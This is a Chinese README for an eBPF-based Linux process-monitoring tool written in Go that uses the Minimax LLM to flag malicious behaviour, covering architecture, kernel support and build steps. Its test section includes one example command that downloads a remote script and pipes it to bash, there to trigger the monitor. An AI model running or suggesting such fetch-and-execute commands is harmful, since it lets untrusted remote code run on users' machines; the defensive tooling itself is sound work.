# ebpf-ai-agent

基于 eBPF 的轻量级 Linux 进程行为安全监控工具。使用 Go 开发，结合 AI（Minimax）进行恶意行为检测。

## 架构

```
┌─────────────────────────────────────────────────────────────┐
│                     用户空间 (Go)                           │
├─────────────────────────────────────────────────────────────┤
│  cmd/main.go           │  pkg/analyzer.go   │ pkg/config/  │
│  - 事件读取           │  - AI 风险分析     │ - 配置加载  │
│  - 行为聚合           │  - JSON 报告输出   │ - YAML 解析 │
│  - 信号处理           │                    │             │
├─────────────────────────────────────────────────────────────┤
│                     内核空间 (eBPF)                         │
│  bpf/probe_*.c                                           │
│  - sched_process_exec Tracepoint 监控                      │
│  - Perf Event / Ring Buffer 事件传递                       │
└─────────────────────────────────────────────────────────────┘
```

**三层模型：**

| 层次 | 组件 | 职责 |
|------|------|------|
| 收集层 | eBPF C 探针 | 内核 Tracepoint 挂载，Ring Buffer 传输 |
| 汇聚层 | Go 用户态 | 事件解析，10-15秒行为聚合 |
| 分析层 | Minimax AI | 风险评估，JSON 报告输出 |

---

## 多内核版本支持

| 内核版本 | BTF | CO-RE | Ringbuf | 探测方式 |
|---------|-----|-------|---------|---------|
| 5.4-5.7 | ❌ | ❌ | ❌ | 手动定义结构体 + perf event |
| 5.8-5.15 | 部分 | 部分 | ✅ | vmlinux.h + perf event |
| 6.0+ | ✅ | ✅ | ✅ | 完整 CO-RE + ringbuf |

---

## 目录结构

```
ebpf-ai-agent/
├── bpf/
│   ├── probe.h           # 公共头文件
│   ├── probe_5_4.c      # 5.4 内核专用探针（无 BTF/CO-RE）
│   ├── probe_5_8.c      # 5.8-5.15 内核探针（ringbuf）
│   ├── probe_6_0.c      # 6.0+ 内核探针（完整 CO-RE）
│   ├── build.sh         # 内核版本检测与编译脚本
│   ├── bpf.go           # go:generate 调用 bpf2go
│   ├── bpf_event*.go    # 自动生成的 eBPF Go 绑定
│   ├── vmlinux.h        # 内核 BTF 头文件（按需生成）
│   └── 编译指南.md       # 详细编译说明
│
├── pkg/
│   ├── analyzer/         # AI 分析模块
│   │   └── analyzer.go  # Minimax API 集成
│   └── config/          # 配置模块
│       └── config.go    # YAML 配置加载
│
├── cmd/
│   └── main.go          # 程序入口，事件循环
│
├── build/
│   ├── remote-build.sh  # 远程构建脚本
│   ├── remote-build.bat # Windows 构建脚本
│   └── config.sh        # 构建配置（gitignore）
│
├── go.mod               # Go 模块定义
├── go.sum               # 依赖锁定
├── config.yaml.example  # 配置示例
└── README.md            # 本文件
```

---

## 核心文件说明

### bpf/probe_*.c

针对不同内核版本的探针实现：

- `probe_5_4.c` - 5.4-5.7 内核，纯手动结构体定义，无 BTF
- `probe_5_8.c` - 5.8-5.15 内核，使用 ringbuf 但不用 CO-RE
- `probe_6_0.c` - 6.0+ 内核，完整 CO-RE 支持

所有探针挂载到 `tp/sched/sched_process_exec`，提取 pid、ppid、filename。

### bpf/build.sh

自动检测内核版本并选择合适的探针编译：

```bash
cd bpf/
./build.sh
```

---

## 依赖

| 依赖 | 版本 | 说明 |
|------|------|------|
| Go | 1.21+ | 用户态程序 |
| clang | any | eBPF 编译 |
| cilium/ebpf | v0.16+ | Go eBPF 库 |
| gopkg.in/yaml.v3 | any | 配置解析 |

---

## 快速开始

### 1. 克隆项目

```bash
git clone https://github.com/your-repo/ebpf-ai-agent.git
cd ebpf-ai-agent
```

### 2. 配置

复制配置示例：

```bash
cp config.yaml.example config.yaml
```

编辑 `config.yaml`：

```yaml
minimax_api_key: "your-api-key"  # 可选，不填则只收集行为
```

### 3. 构建

**方式一：本地构建（推荐）**

```bash
# 检测内核版本并编译
cd bpf/
./build.sh

# 返回项目根目录编译主程序
cd ..
CGO_ENABLED=0 go build -o ebpf-ai-agent ./cmd
```

**方式二：远程构建**

```bash
# 配置腾讯云服务器
export TENANT_HOST="your-server-ip"
export TENANT_USER="ubuntu"
export TENANT_KEY="$HOME/.ssh/your-key.pem"

# 执行构建
./build/remote-build.sh
```

**方式三：交叉编译（路由器/开发板）**

```bash
# ARM64 (如路由器)
GOARCH=arm64 GOOS=linux CGO_ENABLED=0 go build -o ebpf-ai-agent-arm64 ./cmd
```

### 4. 运行

```bash
# 需要 root 权限
sudo ./ebpf-ai-agent
```

### 5. 测试

观察输出：

```bash
# 正常行为
ls /tmp
cat /etc/hostname

# 可疑行为（用于测试监控）
curl -sL https://example.com/script.sh | bash
```

---

## 编译说明

eBPF 代码无法在 Windows 本地编译，需要 Linux 环境。

### 内核版本检测

```bash
uname -r
cat /proc/sys/kernel/unprivileged_bpf_disabled
ls -la /sys/kernel/btf/vmlinux  # 检查 BTF 支持
```

### vmlinux.h 生成

```bash
# 如果内核有 BTF
sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
```

详见：
- [bpf/编译指南.md](bpf/编译指南.md)
- [build/VMware配置与构建指南.md](build/VMware配置与构建指南.md)

---

## 面试亮点

本项目展示了以下技能：

1. **eBPF 探针开发** - 多种内核版本的兼容性处理
2. **CO-RE 技术** - 内核版本差异的解决方案
3. **Go + CGO 分离** - 纯 Go 用户态，C 代码独立编译
4. **交叉编译** - ARM64 路由器部署
5. **AI 安全分析** - LLM API 集成

---

## License

GPL-2.0 OR BSD-3-Clause
